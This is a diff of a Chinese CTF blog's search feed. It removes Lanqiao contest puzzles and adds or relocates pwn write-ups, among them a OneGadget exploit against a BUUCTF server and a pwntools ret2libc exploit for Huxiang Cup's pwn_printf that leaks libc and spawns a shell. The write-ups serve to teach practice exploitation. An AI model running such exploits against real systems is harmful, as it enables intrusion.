+<p><img src="https://img-blog.csdnimg.cn/20201127175251109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25812</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.29.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">printf_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0x106ef8</span></span><br><span class="line">payload = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Give me your one gadget:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p>624</p>
-</blockquote>
-<h2 id="试题B-既约分数"><a href="#试题B-既约分数" class="headerlink" title="试题B 既约分数"></a>试题B 既约分数</h2><p>【问题描述】<br>如果一个分数的分子和分母的最大公约数是1，这个分数称为既约分数。例如，3/4 , 5/2 , 1/8 , 7/1都是既约分数。请问，有多少个既约分数，分子和分母都是1 到2020 之间的整数（包括1和2020）？<br>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2020</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">2020</span>;j++)</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">for</span>(k=i;;k--)</span><br><span class="line">    			<span class="keyword">if</span>(i%k==<span class="number">0</span> &amp;&amp; j%k==<span class="number">0</span>)</span><br><span class="line">    				<span class="keyword">break</span>;</span><br><span class="line">    		<span class="keyword">if</span>(k==<span class="number">1</span>)</span><br><span class="line">    			num++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;num;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="试题C-蛇形填数"><a href="#试题C-蛇形填数" class="headerlink" title="试题C 蛇形填数"></a>试题C 蛇形填数</h2><p>【问题描述】<br>如下图所示，小明用从1 开始的正整数“蛇形”填充无限大的矩阵。</p>
-<p><img src="/.ink//image-20210412201731138.png" alt="image-20210412201731138"></p>
-<p>容易看出矩阵第二行第二列中的数是5。请你计算矩阵中第20 行第20 列的数是多少？</p>
-<p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
-<h2 id="试题D-跑步锻炼"><a href="#试题D-跑步锻炼" class="headerlink" title="试题D 跑步锻炼"></a>试题D 跑步锻炼</h2><p>【问题描述】<br>小蓝每天都锻炼身体。<br>正常情况下，小蓝每天跑 1 千米。如果某天是周一或者月初（1 日），为了<br>激励自己，小蓝要跑 2 千米。如果同时是周一或月初，小蓝也是跑 2 千米。<br>小蓝跑步已经坚持了很长时间，从 2000 年 1 月 1 日周六（含）到 2020 年<br>10 月 1 日周四（含）。请问这段时间小蓝总共跑步多少千米？</p>
-<p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一<br>个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
-<h2 id="试题E-七段码"><a href="#试题E-七段码" class="headerlink" title="试题E 七段码"></a>试题E 七段码</h2><p>【问题描述】<br>小蓝要用七段码数码管来表示一种特殊的文字。</p>
-<p>七段码上图给出了七段码数码管的一个图示，数码管中一共有7 段可以发光的二极管，分别标记为a, b, c, d, e, f, g。小蓝要选择一部分二极管（至少要有一个）发光来表达字符。在设计字符的表达时，要求所有发光的二极管是连成一片的。<br>例如：b 发光，其他二极管不发光可以用来表达一种字符。<br>例如：c 发光，其他二极管不发光可以用来表达一种字符。这种方案与上一行的方案可以用来表示不同的字符，尽管看上去比较相似。<br>例如：a, b, c, d, e 发光，f, g 不发光可以用来表达一种字符。<br>例如：b, f 发光，其他二极管不发光则不能用来表达一种字符，因为发光的二极管没有连成一片。<br>请问，小蓝可以用七段码数码管表达多少种不同的字符？</p>
-<p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一<br>个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
 ]]></content>
       <categories>
-        <category>program</category>
+        <category>WriteUp</category>
       </categories>
+      <tags>
+        <tag>OneGadget</tag>
+      </tags>
   </entry>
   <entry>
     <title>_stack_chk_fail</title>
-    <url>/2021/03/24/stack_chk_fail/</url>
+    <url>/2021/03/24/stack_chk_fail_(cannay)/</url>
     <content><![CDATA[<h1 id="stack-chk-fail"><a href="#stack-chk-fail" class="headerlink" title="stack_chk_fail"></a>stack_chk_fail</h1><span id="more"></span>
 <h4 id="BJDCTF-2nd"><a href="#BJDCTF-2nd" class="headerlink" title="BJDCTF_2nd"></a>BJDCTF_2nd</h4><h2 id="r2t4"><a href="#r2t4" class="headerlink" title="r2t4"></a>r2t4</h2><h4 id="格式化字符串-stack-chk-fail"><a href="#格式化字符串-stack-chk-fail" class="headerlink" title="格式化字符串 + _stack_chk_fail"></a>格式化字符串 + _stack_chk_fail</h4><p>看ida</p>
 <p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223180634.png" alt="20201223180634"></p>
@@ -1151,7 +1152,7 @@
   </entry>
   <entry>
     <title>整形溢出</title>
-    <url>/2021/03/24/Shaping%20overflow/</url>
+    <url>/2021/03/24/%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA/</url>
     <content><![CDATA[<h1 id="整形溢出"><a href="#整形溢出" class="headerlink" title="整形溢出"></a>整形溢出</h1><span id="more"></span>
 <h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>来自buuctf</p>
 <p>先看ida</p>
@@ -1185,7 +1186,7 @@
   </entry>
   <entry>
     <title>栈迁移</title>
-    <url>/2021/03/24/Stack%20migration/</url>
+    <url>/2021/03/24/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
     <content><![CDATA[<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><span id="more"></span>
 
 <h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="_ciscn_2019_es_2"></a>_ciscn_2019_es_2</h1><p>第一步：是把一个与ebp有关的地址泄漏出来，可以通过栈的填充做到</p>
@@ -1244,7 +1245,7 @@
   </entry>
   <entry>
     <title>汇编</title>
-    <url>/2021/07/11/assembly/</url>
+    <url>/2021/07/11/%E6%B1%87%E7%BC%96/</url>
     <content><![CDATA[<h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><span id="more"></span>
 
 
@@ -1283,42 +1284,8 @@
       </categories>
   </entry>
   <entry>
-    <title>湖湘杯hxb_Pwn</title>
-    <url>/2021/03/30/hxb_Pwn/</url>
-    <content><![CDATA[<h1 id="湖湘杯hxb-pwn"><a href="#湖湘杯hxb-pwn" class="headerlink" title="湖湘杯hxb_pwn"></a>湖湘杯hxb_pwn</h1><span id="more"></span>
-<h2 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h2><h3 id="pwn-libc"><a href="#pwn-libc" class="headerlink" title="pwn_libc"></a>pwn_libc</h3><p>ida</p>
-<p><img src="https://img-blog.csdnimg.cn/20201108200522719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>16次循环<br>下面if判断v12&lt;=0x20<br>所以写</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	n.sendline(<span class="string">&quot;32&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>跟进if下面的函数</p>
-<p><img src="https://img-blog.csdnimg.cn/20201108200913518.png#pic_center" alt="在这里插入图片描述"></p>
-<p>这里变量的栈是空栈0h，所以offset只需要64bit程序的8个就行。<br>再然后a * a1，所以传参需要double 0x20，也就是0x40<br><code>ROPgadget --binary pwn_printf</code><br>找到pop_rdi_ret的地址<br>复习一下libc64_payload公式</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">64</span>位payload: payload = <span class="string">&quot;a&quot;</span>*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr/main)</span><br></pre></td></tr></table></figure>
-
-
-<p>写exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401213</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	n.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(<span class="number">0x40</span>) + p64(<span class="number">0x4007C6</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You will find this game very interesting\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(sh.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>
-
-<p>这就print出来了puts的地址</p>
-<p><img src="https://img-blog.csdnimg.cn/20201108201921266.png#pic_center" alt="在这里插入图片描述"></p>
-<p>到<a href="https://libc.blukat.me/">libc database search</a>查一下相关libc信息</p>
-<p>在套用一下公式</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - <span class="number">0x080a30</span>    <span class="comment"># -libc_Offset的puts</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + <span class="number">0x04f4e0</span>   <span class="comment"># +libc_Offset的system</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b40fa</span>		<span class="comment"># +libc_Offset的bin/sh</span></span><br></pre></td></tr></table></figure>
-
-<p>复习一下libc64_getshell公式</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">getshell: <span class="string">&quot;a&quot;</span>*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr)</span><br></pre></td></tr></table></figure>
-
-<p>完整exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401213</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	sh.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(<span class="number">0x40</span>) + p64(<span class="number">0x4007C6</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You will find this game very interesting\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(sh.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x080a30</span> <span class="comment">#0x6f6a0</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x04f4e0</span> <span class="comment">#0x0453a0</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b40fa</span> <span class="comment">#0x18ce17 </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x4007C6</span>) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>比赛WriteUp</category>
-      </categories>
-  </entry>
-  <entry>
     <title>湖湘杯hxb_Re</title>
-    <url>/2021/03/30/hxb_Re/</url>
+    <url>/2021/03/30/%E6%B9%96%E6%B9%98%E6%9D%AFhxb_Re/</url>
     <content><![CDATA[<h1 id="湖湘杯hxb-Re"><a href="#湖湘杯hxb-Re" class="headerlink" title="湖湘杯hxb_Re"></a>湖湘杯hxb_Re</h1><span id="more"></span>
 <h2 id="easy-c"><a href="#easy-c" class="headerlink" title="easy_c++"></a>easy_c++</h2><p><img src="https://img-blog.csdnimg.cn/2020111417004942.png#pic_center" alt="在这里插入图片描述"></p>
 <p>长度32</p>
@@ -1353,6 +1320,40 @@
 <p>输出结果：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">15</span> +</span><br><span class="line"><span class="number">16</span> <span class="number">1</span></span><br><span class="line"><span class="number">13</span> <span class="number">3</span></span><br><span class="line"><span class="number">19</span> <span class="number">3</span></span><br><span class="line"><span class="number">24</span> <span class="number">5</span></span><br><span class="line"><span class="number">9</span> @</span><br><span class="line"><span class="number">5</span> M</span><br><span class="line"><span class="number">8</span> M</span><br><span class="line"><span class="number">18</span> R</span><br><span class="line"><span class="number">22</span> T</span><br><span class="line"><span class="number">14</span> X</span><br><span class="line"><span class="number">7</span> _</span><br><span class="line"><span class="number">12</span> _</span><br><span class="line"><span class="number">17</span> _</span><br><span class="line"><span class="number">21</span> _</span><br><span class="line"><span class="number">2</span> a</span><br><span class="line"><span class="number">23</span> e</span><br><span class="line"><span class="number">0</span> f</span><br><span class="line"><span class="number">3</span> g</span><br><span class="line"><span class="number">11</span> h</span><br><span class="line"><span class="number">1</span> l</span><br><span class="line"><span class="number">10</span> t</span><br><span class="line"><span class="number">25</span> t</span><br><span class="line"><span class="number">20</span> v</span><br><span class="line"><span class="number">6</span> y</span><br><span class="line"><span class="number">4</span> &#123;</span><br><span class="line"><span class="number">26</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>手动操作一下就ok</p>
+]]></content>
+      <categories>
+        <category>比赛WriteUp</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>湖湘杯hxb_Pwn</title>
+    <url>/2021/03/30/%E6%B9%96%E6%B9%98%E6%9D%AFhxb_Pwn/</url>
+    <content><![CDATA[<h1 id="湖湘杯hxb-pwn"><a href="#湖湘杯hxb-pwn" class="headerlink" title="湖湘杯hxb_pwn"></a>湖湘杯hxb_pwn</h1><span id="more"></span>
+<h2 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h2><h3 id="pwn-libc"><a href="#pwn-libc" class="headerlink" title="pwn_libc"></a>pwn_libc</h3><p>ida</p>
+<p><img src="https://img-blog.csdnimg.cn/20201108200522719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>16次循环<br>下面if判断v12&lt;=0x20<br>所以写</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	n.sendline(<span class="string">&quot;32&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>跟进if下面的函数</p>
+<p><img src="https://img-blog.csdnimg.cn/20201108200913518.png#pic_center" alt="在这里插入图片描述"></p>
+<p>这里变量的栈是空栈0h，所以offset只需要64bit程序的8个就行。<br>再然后a * a1，所以传参需要double 0x20，也就是0x40<br><code>ROPgadget --binary pwn_printf</code><br>找到pop_rdi_ret的地址<br>复习一下libc64_payload公式</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">64</span>位payload: payload = <span class="string">&quot;a&quot;</span>*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr/main)</span><br></pre></td></tr></table></figure>
+
+
+<p>写exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401213</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	n.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(<span class="number">0x40</span>) + p64(<span class="number">0x4007C6</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You will find this game very interesting\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(sh.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>
+
+<p>这就print出来了puts的地址</p>
+<p><img src="https://img-blog.csdnimg.cn/20201108201921266.png#pic_center" alt="在这里插入图片描述"></p>
+<p>到<a href="https://libc.blukat.me/">libc database search</a>查一下相关libc信息</p>
+<p>在套用一下公式</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - <span class="number">0x080a30</span>    <span class="comment"># -libc_Offset的puts</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + <span class="number">0x04f4e0</span>   <span class="comment"># +libc_Offset的system</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b40fa</span>		<span class="comment"># +libc_Offset的bin/sh</span></span><br></pre></td></tr></table></figure>
+
+<p>复习一下libc64_getshell公式</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">getshell: <span class="string">&quot;a&quot;</span>*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr)</span><br></pre></td></tr></table></figure>
+
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401213</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	sh.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(<span class="number">0x40</span>) + p64(<span class="number">0x4007C6</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You will find this game very interesting\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(sh.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x080a30</span> <span class="comment">#0x6f6a0</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x04f4e0</span> <span class="comment">#0x0453a0</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b40fa</span> <span class="comment">#0x18ce17 </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x4007C6</span>) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>比赛WriteUp</category>
@@ -1559,7 +1560,7 @@
   </entry>
   <entry>
     <title>Fmtstr</title>
-    <url>/2021/03/24/Fmtstr/</url>
+    <url>/2021/03/24/FmtStr/</url>
     <content><![CDATA[<h1 id="Fmtstr"><a href="#Fmtstr" class="headerlink" title="Fmtstr"></a>Fmtstr</h1><span id="more"></span>
 
 
